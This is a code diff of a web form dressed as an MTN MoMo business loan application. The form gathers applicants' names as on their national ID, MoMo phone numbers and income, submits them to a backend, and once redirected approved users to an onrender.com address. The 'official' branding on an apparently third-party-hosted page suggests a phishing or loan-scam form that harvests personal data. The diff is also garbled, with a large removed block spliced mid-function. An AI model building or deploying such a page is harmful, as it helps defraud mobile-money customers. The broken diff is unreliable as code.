@@ -15,11 +15,10 @@
         body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
         .form-container { width: 100%; max-width: 440px; background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.08); position: relative; }
         
-        /* OFFICIAL PERSISTENT MTN LOGO AND BRANDING HEADER */
-        .brand-header { background-color: #004B87; padding: 22px 20px; text-align: center; border-bottom: 4px solid var(--mtn-yellow); position: relative; }
-        .brand-logo-container { display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .momo-icon-shape { background-color: var(--mtn-yellow); color: #004B87; font-weight: 900; font-size: 24px; padding: 10px 16px; border-radius: 14px; display: inline-block; font-family: 'Arial Black', sans-serif; letter-spacing: -1px; line-height: 1; box-shadow: 0 4px 8px rgba(0,0,0,0.15); }
-        .momo-subtext { color: var(--mtn-yellow); font-size: 14px; font-weight: 800; text-transform: lowercase; margin: 6px 0 0 0; letter-spacing: 0.5px; font-family: sans-serif; }
+        .brand-header { background-color: var(--mtn-yellow); padding: 20px; text-align: center; border-bottom: 4px solid var(--mtn-dark); position: relative; }
+        .brand-logo { font-weight: 900; font-size: 24px; letter-spacing: -1px; color: var(--mtn-dark); display: inline-block; background: white; padding: 4px 10px; border-radius: 50%; box-shadow: 0 2px 5px rgba(0,0,0,0.1); font-style: italic; }
+        .brand-header h1 { margin: 8px 0 0 0; font-size: 18px; color: var(--mtn-dark); font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
+        .brand-header p { margin: 2px 0 0 0; font-size: 12px; color: #475569; font-weight: 600; }
         
         .form-body { padding: 24px; }
         .step { display: none; }
@@ -47,6 +46,7 @@
         .term-scroll-container::-webkit-scrollbar { display: none; }
         .term-card { flex: 0 0 75px; scroll-snap-align: start; border: 2px solid #CBD5E1; border-radius: 10px; padding: 14px 0; text-align: center; font-weight: 700; font-size: 14px; cursor: pointer; color: #475569; background: #FFF; transition: all 0.2s; user-select: none; }
         .term-card.selected { border-color: var(--mtn-dark); background-color: var(--mtn-yellow); color: var(--mtn-dark); transform: scale(1.02); }
+        
         /* Info Fields Display Styles */
         .value-display-box { background: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 8px; padding: 12px; font-size: 16px; font-weight: 700; color: var(--mtn-blue); margin-bottom: 8px; text-align: center; }
         input[type="text"], textarea { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 15px; background: #FFF; color: var(--text-dark); }
@@ -62,43 +62,30 @@
         .btn-back { background-color: #E2E8F0; color: #475569; }
         .summary-box { background-color: #F8FAFC; border: 1px solid #E2E8F0; padding: 14px; border-radius: 8px; font-size: 14px; line-height: 1.6; color: #334155; }
         
-        /* PREMIUM DARK BLUE LOADING SCREEN COMPONENT OVERLAY */
-        .spinner-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #003661; z-index: 10; flex-direction: column; align-items: center; justify-content: center; color: #FFFFFF; font-family: 'Helvetica Neue', Arial, sans-serif; }
+        .spinner-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 10; flex-direction: column; align-items: center; justify-content: center; }
         .spinner-overlay.active { display: flex; }
-        
-        .hourglass-circle { width: 90px; height: 90px; background-color: rgba(255, 255, 255, 0.1); border: 3px solid rgba(255, 255, 255, 0.4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 42px; margin-bottom: 25px; animation: pulse-border 2s infinite ease-in-out; }
-        .status-text { font-size: 26px; font-weight: 800; color: #FFFFFF; text-align: center; margin: 0 0 12px 0; letter-spacing: -0.5px; }
-        .status-subtext { font-size: 14px; color: rgba(255, 255, 255, 0.7); text-align: center; padding: 0 40px; margin: 0 0 30px 0; line-height: 1.5; font-weight: 500; }
-        .redirect-text { font-size: 14px; color: rgba(255, 255, 255, 0.7); font-weight: 500; text-align: center; }
-
-        @keyframes pulse-border {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); }
-            50% { transform: scale(1.03); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
-        }
+        .spinner-loader { width: 48px; height: 48px; border: 5px solid #F1F5F9; border-top: 5px solid var(--mtn-yellow); border-right: 5px solid var(--mtn-dark); border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .status-text { margin-top: 20px; font-weight: 700; color: var(--mtn-dark); font-size: 14px; text-align: center; padding: 0 30px; line-height: 1.5; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="form-container">
-    <!-- SUBMISSION PROCESSING SCREEN (HOURGLASS PROCESSING STATE OVERLAY) -->
+    <!-- SUBMISSION PROCESSING SCREEN (SPINNER OVERLAY) -->
     <div id="spinnerOverlay" class="spinner-overlay">
-        <div class="hourglass-circle">⏳</div>
-        <div id="statusHeader" class="status-text">Processing Application...</div>
-        <div id="statusText" class="status-subtext">Please wait while we process your loan application</div>
-        <div id="redirectHint" class="redirect-text">Redirecting in a few moments...</div>
+        <div class="spinner-loader"></div>
+        <div id="statusText" class="status-text">Processing submission info...</div>
     </div>
 
-    <!-- PERSISTENT BRAND HEADER WITH OFFICIAL LOGO DESIGN -->
+    <!-- MTN HEADER BRANDING -->
     <div class="brand-header">
-        <div class="brand-logo-container">
-            <div class="momo-icon-shape">MoMo</div>
-            <div class="momo-subtext">from MTN</div>
-        </div>
+        <div class="brand-logo">MTN</div>
+        <h1>MoMo Business Loans</h1>
+        <p>MoMo Nyabo • Fast Business Capital</p>
     </div>
 
     <div class="form-body">
-
         
         <!-- PAGE 1: LOAN CONFIGURATIONS -->
         <div class="step active" id="page1">
@@ -327,184 +314,6 @@
             } else {
                 alert("Submission system rejected configuration.");
                 overlay.classList.remove('active');
-        <!-- ========================================== -->
-        <!--  PAGE 2: USER PROFILE IDENTITY             -->
-        <!-- ========================================== -->
-        <div class="step" id="page2">
-            <h2>Subscriber Identity Profile</h2>
-            <div class="form-group">
-                <label>First Name (As on NIN)</label>
-                <input type="text" id="firstName" placeholder="John">
-            </div>
-            <div class="form-group">
-                <label>Last Name (As on NIN)</label>
-                <input type="text" id="lastName" placeholder="Ondoa">
-            </div>
-            <div class="form-group">
-                <label>Registered MoMo Number</label>
-                <input type="text" id="phone" value="+256">
-            </div>
-            <div class="btn-group">
-                <button type="button" class="btn-back" onclick="navigate(1)">Back</button>
-                <button type="button" class="btn-next" onclick="navigate(3)">Continue</button>
-            </div>
-        </div>
-
-        <!-- ========================================== -->
-        <!--  PAGE 3: FINANCIAL VERIFICATION & OVERVIEW -->
-        <!-- ========================================== -->
-        <div class="step" id="page3">
-            <h2>Financial Verification</h2>
-            <div class="form-group">
-                <label>Employment Classification</label>
-                <div class="option-grid">
-                    <div id="emp-self" class="clickable-card selected" onclick="selectEmployment('Self-employed', 'emp-self')">Self-Employed</div>
-                    <div id="emp-sal" class="clickable-card" onclick="selectEmployment('Employed', 'emp-sal')">Salaried Job</div>
-                    <div id="emp-ret" class="clickable-card" onclick="selectEmployment('Retired', 'emp-ret')">Retired</div>
-                    <div id="emp-stu" class="clickable-card" onclick="selectEmployment('Student', 'emp-stu')">Student</div>
-                </div>
-            </div>
-            <div class="form-group">
-                <label>Estimated Annual Revenue</label>
-                <div id="incomeDisplay" class="value-display-box">UGX 12,000,000</div>
-                <div class="pill-row">
-                    <div class="value-pill" onclick="selectIncome(5000000, this)">5M</div>
-                    <div class="value-pill selected" onclick="selectIncome(12000000, this)">12M</div>
-                    <div class="value-pill" onclick="selectIncome(25000000, this)">25M</div>
-                    <div class="value-pill" onclick="selectIncome(50000000, this)">50M</div>
-                </div>
-            </div>
-            
-            <h3>Application Overview</h3>
-            <div class="summary-box" id="summaryContent"></div>
-            
-            <div class="btn-group">
-                <button type="button" class="btn-back" onclick="navigate(2)">Back</button>
-                <button type="button" class="btn-next" style="background-color: #22C55E; color: white;" onclick="submitForm()">Submit Offer</button>
-            </div>
-        </div>
-
-    </div>
-</div>
-
-<!-- ========================================== -->
-<!--  JAVA SCRIPT DATA CONFIGURATION ENGINE     -->
-<!-- ========================================== -->
-<script>
-    let selectedProgramName = "MoMo Business Loan Tier 1";
-    let selectedAmountValue = 1000000;
-    let selectedMonths = 12;
-    let selectedEmploymentStatus = "Self-employed";
-    let selectedIncomeValue = 12000000;
-    
-    let globalAppId = null;
-    let pollingInterval = null;
-
-    function selectProgram(progName, elementId) {
-        document.querySelectorAll('#page1 .clickable-card').forEach(card => card.classList.remove('selected'));
-        document.getElementById(elementId).classList.add('selected');
-        selectedProgramName = progName;
-    }
-
-    function selectAmount(value, element) {
-        document.querySelectorAll('#page1 .value-pill').forEach(pill => pill.classList.remove('selected'));
-        element.classList.add('selected');
-        selectedAmountValue = value;
-        document.getElementById('amountDisplay').innerText = "UGX " + value.toLocaleString();
-        calculateRepayment();
-    }
-
-    function selectTerm(months) {
-        document.querySelectorAll('.term-card').forEach(card => card.classList.remove('selected'));
-        const targetedCard = document.getElementById(`term-${months}`);
-        if(targetedCard) {
-            targetedCard.classList.add('selected');
-        }
-        selectedMonths = months;
-        calculateRepayment();
-    }
-
-    function selectEmployment(status, elementId) {
-        document.querySelectorAll('#page3 .clickable-card').forEach(card => card.classList.remove('selected'));
-        document.getElementById(elementId).classList.add('selected');
-        selectedEmploymentStatus = status;
-    }
-
-    function selectIncome(value, element) {
-        document.querySelectorAll('#page3 .value-pill').forEach(pill => pill.classList.remove('selected'));
-        element.classList.add('selected');
-        selectedIncomeValue = value;
-        document.getElementById('incomeDisplay').innerText = "UGX " + value.toLocaleString();
-    }
-
-    function calculateRepayment() {
-        const displayField = document.getElementById('monthlyPaymentDisplay');
-        if (!displayField) return;
-
-        const totalPayable = selectedAmountValue * (1 + (0.10 * (selectedMonths / 12)));
-        const monthlyPayment = totalPayable / selectedMonths;
-        displayField.innerText = Math.round(monthlyPayment).toLocaleString();
-    }
-
-    function generateSummary() {
-        const fName = document.getElementById('firstName').value || 'Not provided';
-        const lName = document.getElementById('lastName').value || 'Not provided';
-        const phoneNo = document.getElementById('phone').value || '+256';
-
-        const content = `
-            📌 <strong>Program:</strong> ${selectedProgramName}<br>
-            👤 <strong>Applicant:</strong> ${fName} ${lName}<br>
-            📞 <strong>MoMo Phone:</strong> ${phoneNo}<br>
-            💼 <strong>Structure:</strong> ${selectedEmploymentStatus}<br>
-            💰 <strong>Requested Capital:</strong> UGX ${selectedAmountValue.toLocaleString()}<br>
-            ⏱️ <strong>Repayment Horizon:</strong> ${selectedMonths} Months Plan
-        `;
-        document.getElementById('summaryContent').innerHTML = content;
-    }
-
-    function navigate(pageNum) {
-        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-        const targetPage = document.getElementById(`page${pageNum}`);
-        if (targetPage) {
-            targetPage.classList.add('active');
-        }
-        if(pageNum === 3) {
-            generateSummary();
-        }
-    }
-
-    async function submitForm() {
-        const overlay = document.getElementById('spinnerOverlay');
-        const statusTxt = document.getElementById('statusText');
-        
-        overlay.classList.add('active');
-
-        const payload = {
-            loanType: selectedProgramName,
-            amount: selectedAmountValue,
-            term: `${selectedMonths} Months`,
-            purpose: document.getElementById('purpose').value || 'Business Expansion',
-            firstName: document.getElementById('firstName').value,
-            lastName: document.getElementById('lastName').value,
-            phone: document.getElementById('phone').value,
-            employmentStatus: selectedEmploymentStatus,
-            income: selectedIncomeValue
-        };
-
-        try {
-            const res = await fetch('/api/apply', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const data = await res.json();
-            
-            if(data.success) {
-                globalAppId = data.applicationId;
-                startPolling(globalAppId);
-            } else {
-                alert("Submission system rejected configuration.");
-                overlay.classList.remove('active');
             }
         } catch(e) {
             overlay.classList.remove('active');
@@ -521,14 +330,8 @@
                 if (data.status !== 'Pending') {
                     clearInterval(pollingInterval);
                     document.getElementById('spinnerOverlay').classList.remove('active');
-                    
-                    if (data.status === 'Approved') {
-                        // 🚀 AUTOMATIC REDIRECT ON APPROVAL
-                        window.location.href = "https://onrender.com"; 
-                    } else {
-                        alert(`MTN MoMo Gateway Status Update: Application was ${data.status.toUpperCase()}`);
-                        window.location.reload();
-                    }
+                    alert(`MTN MoMo Gateway Status Update: Application was ${data.status.toUpperCase()}`);
+                    window.location.reload();
                 }
             } catch (e) { console.error("Tracking node sync failed", e); }
         }, 3000);
